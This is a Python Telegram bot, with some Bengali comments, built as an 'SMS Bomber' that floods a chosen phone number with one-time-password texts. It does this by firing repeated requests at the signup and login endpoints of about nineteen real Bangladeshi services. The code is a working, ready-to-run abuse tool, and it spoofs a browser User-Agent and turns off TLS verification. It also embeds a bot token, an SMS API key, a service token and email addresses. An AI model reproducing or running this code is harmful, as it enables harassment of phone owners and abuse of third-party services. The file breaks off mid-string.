import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import ssl
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===================== কনফিগারেশন =====================
BOT_TOKEN = "8826486988:AAFOOfdcrVCgvj532plzOQUXwx40yn3USl0"
ADMIN_ID = 1967494059
ADMIN_USERNAME = "@RobiEntertainment"
OWNER_USERNAME = "@RobiEntertainment"

# SMS API
SMS_API_URL = "https://api.paglahost.shop/Custom_SMS/api.php"
SMS_API_KEY = "Shuvo55356"

# ===================== কাজ করা API (২৭টি) =====================
WORKING_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
]

# ===================== হেল্পার ফাংশন =====================
def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def check_success(text, status):
    if status in [200, 201, 202]:
        success_keywords = ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified']
        return any(word in text.lower() for word in success_keywords)
    return False

# ===================== লগিং =====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===================== ডাটাবেস =====================
async def init_db():
    try:
        async with aiosqlite.connect("bot_database.db") as db:
            await db.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance INTEGER DEFAULT 10,
                total_sms INTEGER DEFAULT 0,
                total_bombing INTEGER DEFAULT 0,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount INTEGER,
                usages INTEGER
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
                user_id INTEGER,
                code TEXT,
                PRIMARY KEY (user_id, code)
            )""")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages) VALUES ('FREE50', 50, 100)")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages) VALUES ('WELCOME10', 10, 200)")
            await db.commit()
            logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"Database error: {e}")

# ===================== কীবোর্ড =====================
def get_main_keyboard():
    keyboard = [
        ["📨 Send SMS", "💣 SMS Bomber"],
        ["👤 My Profile", "🎁 Redeem Code"],
        ["📊 My Stats", "📞 Contact Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    keyboard = [["🔙 Back"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===================== স্টার্ট =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    async with aiosqlite.connect("bot_database.db") as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
            (user_id, user.username or user.first_name)
        )
        await db.commit()
    
    await update.message.reply_text(
        f"🔥 **Welcome {user.first_name}!**\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Balance: 10 Credits\n"
        f"📡 APIs: {len(WORKING_APIS)}\n\n"
        f"📌 **Select an option:**",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ===================== GET TOTAL SMS =====================
async def get_total_sms(user_id):
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT total_sms FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else 0

# ===================== SEND SMS =====================
async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text(
                    f"❌ **Insufficient credits!**\n"
                    f"💰 Balance: {row[0] if row else 0}\n"
                    f"👨‍💻 Contact: {ADMIN_USERNAME}",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard()
                )
                return
    
    await update.message.reply_text(
        "📨 **Send SMS**\n\n"
        "Enter phone number:\n"
        "Example: `018XXXXXXXX`\n"
        "💰 Cost: 1 Credit",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'sms_number'

async def sms_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text(
            "❌ Invalid number!\nEnter 11 digits:",
            reply_markup=get_back_keyboard()
        )
        return
    
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    
    await update.message.reply_text(
        f"✅ Number: `{number}`\n\n"
        f"💬 **Enter your message:**",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg_text = update.message.text
    
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    await update.message.reply_text(f"⏳ Sending SMS to `{number}`...", parse_mode="Markdown")
    
    success = False
    response_text = ""
    
    try:
        params = {"key": SMS_API_KEY, "number": number, "msg": msg_text}
        async with aiohttp.ClientSession() as session:
            async with session.get(SMS_API_URL, params=params, timeout=30) as resp:
                response_text = await resp.text()
                try:
                    data = await resp.json()
                    if data.get("status") == "success":
                        success = True
                except:
                    if "success" in response_text.lower():
                        success = True
    except Exception as e:
        response_text = str(e)
        logger.error(f"SMS error: {e}")
    
    if success:
        async with aiosqlite.connect("bot_database.db") as db:
            await db.execute("UPDATE users SET balance = balance - 1 WHERE user_id = ?", (user_id,))
            await db.execute("UPDATE users SET total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
            await db.commit()
        
        await update.message.reply_text(
            f"✅ **SMS Sent Successfully!**\n\n"
            f"📱 Number: `{number}`\n"
            f"💰 1 Credit deducted\n"
            f"📨 Total Sent: {await get_total_sms(user_id)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ **Failed to send SMS!**\n\n"
            f"📱 Number: `{number}`\n"
            f"⚠️ Error: `{response_text[:100]}`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    
    context.user_data.clear()

# ===================== SMS BOMBER =====================
async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💣 **SMS Bomber**\n\n"
        "Enter target number:\n"
        "Example: `018XXXXXXXX`\n"
        f"📡 APIs: {len(WORKING_APIS)}\n"
        "⚠️ Max 20 per API",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text(
            "❌ Invalid number!\nEnter 11 digits:",
            reply_markup=get_back_keyboard()
        )
        return
    
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    
    await update.message.reply_text(
        f"✅ Number: `{number}`\n\n"
        f"💥 **Enter amount (1-20 per API):**\n"
        f"📊 Total: {len(WORKING_APIS)} x amount",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    
    try:
        amount = int(update.message.text.strip())
        if amount < 1 or amount > 20:
            await update.message.reply_text("❌ Amount must be 1-20!", reply_markup=get_back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number!", reply_markup=get_back_keyboard())
        return
    
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    total_apis = len(WORKING_APIS)
    total_sms = total_apis * amount
    
    msg = await update.message.reply_text(
        f"⏳ **Bombing Started!**\n\n"
        f"📱 Target: `{number}`\n"
        f"📡 APIs: {total_apis}\n"
        f"💥 Per API: {amount}\n"
        f"📊 Total: {total_sms}\n"
        f"⏰ Please wait...",
        parse_mode="Markdown"
    )
    
    success_count = 0
    failed_count = 0
    api_results = []
    
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for i, api in enumerate(WORKING_APIS, 1):
            api_success = 0
            api_failed = 0
            
            for j in range(amount):
                try:
                    body = replace_phone(api['body'], number)
                    
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "application/json",
                        "Content-Type": "application/json"
                    }
                    
                    await asyncio.sleep(random.uniform(0.3, 0.8))
                    
                    if api['method'] == 'POST':
                        async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
                            status = resp.status
                            text = await resp.text()
                            
                            if check_success(text, status):
                                api_success += 1
                                success_count += 1
                            else:
                                api_failed += 1
                                failed_count += 1
                    else:
                        async with session.get(api['url'], headers=headers, timeout=15) as resp:
                            if resp.status in [200, 201, 202]:
                                api_success += 1
                                success_count += 1
                            else:
                                api_failed += 1
                                failed_count += 1
                                
                except Exception as e:
                    api_failed += 1
                    failed_count += 1
                    logger.error(f"API error {api['name']}: {e}")
                
                total_done = (i-1) * amount + (j+1)
                if total_done % 10 == 0 or total_done == total_sms:
                    try:
                        await msg.edit_text(
                            f"⏳ **Bombing...**\n\n"
                            f"📱 Target: `{number}`\n"
                            f"✅ Success: {success_count}\n"
                            f"❌ Failed: {failed_count}\n"
                            f"📊 Progress: {total_done}/{total_sms}",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
            
            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
    
    async with aiosqlite.connect("bot_database.db") as db:
        await db.execute("UPDATE users SET total_bombing = total_bombing + 1 WHERE user_id = ?", (user_id,))
        await db.commit()
    
    success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0
    
    top_apis = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
    top_apis_text = ""
    for idx, api in enumerate(top_apis, 1):
        if api['success'] > 0:
            top_apis_text += f"{idx}. {api['name']}: ✅{api['success']}\n"
    
    if not top_apis_text:
        top_apis_text = "❌ No successful APIs!"
    
    result_message = (
        f"✅ **Bombing Complete!**\n\n"
        f"📱 Target: `{number}`\n"
        f"📡 APIs Used: {total_apis}\n"
        f"💥 Total Sent: {total_sms}\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {failed_count}\n"
        f"📊 Success Rate: {success_rate}%\n\n"
        f"🏆 **Top 10 APIs:**\n{top_apis_text}"
    )
    
    await msg.edit_text(result_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

# ===================== প্রোফাইল =====================
async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute(
            "SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id = ?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    
    if row:
        await update.message.reply_text(
            f"👤 **My Profile**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"👤 Username: {row[0] or 'N/A'}\n"
            f"💰 Balance: {row[1]}\n"
            f"📨 SMS Sent: {row[2]}\n"
            f"💣 Bombing Done: {row[3]}\n"
            f"🚦 Status: {row[5].capitalize()}\n"
            f"📅 Joined: {row[4][:10] if row[4] else 'N/A'}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

# ===================== স্ট্যাটস =====================
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute(
            "SELECT balance, total_sms, total_bombing FROM users WHERE user_id = ?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    
    if row:
        await update.message.reply_text(
            f"📊 **My Stats**\n\n"
            f"💰 Balance: {row[0]}\n"
            f"📨 SMS Sent: {row[1]}\n"
            f"💣 Bombing Done: {row[2]}\n"
            f"📡 Total APIs: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

# ===================== রিডিম =====================
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎟 **Enter Redeem Code:**\n\n"
        "Available: `FREE50`, `WELCOME10`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'redeem_code'

async def redeem_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code)) as cur:
            if await cur.fetchone():
                await update.message.reply_text("❌ You already used this code!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
        
        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await update.message.reply_text("❌ Invalid or expired code!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
            
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
            await db.commit()
    
    await update.message.reply_text(
        f"🎉 **Code Redeemed!**\n✅ +{amount} Credits!",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    context.user_data.clear()

# ===================== কন্টাক্ট =====================
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📞 **Contact**
